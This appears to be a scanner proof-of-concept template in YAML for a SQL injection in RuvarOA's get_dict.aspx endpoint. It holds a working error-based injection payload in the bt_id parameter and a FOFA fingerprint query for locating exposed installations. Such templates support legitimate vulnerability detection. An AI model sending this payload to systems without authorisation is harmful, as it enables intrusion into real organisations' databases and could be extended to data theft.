id: poc-yaml-ruvaroa-get-dict-aspx-sqli
info:
  name: RuvarOA get_dict.aspx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: ruvar-oa
  fofa: body="txt_admin_key"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: GET
  path: /include/get_dict.aspx?bi_value=1&bt_id=1%29+AND+1248+IN+%28SELECT+sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{.t1}}%27))%29+AND+%282558%3D2558&bt_name=1&bi_name=1
  expression: "status_code == 500 && \ncontains(body,\"在将 nvarchar 值\") &&\ncontains(body,\"\
    转换成数据类型 int 时失败\") &&\ncontains(body,t2)\n"
transport: http
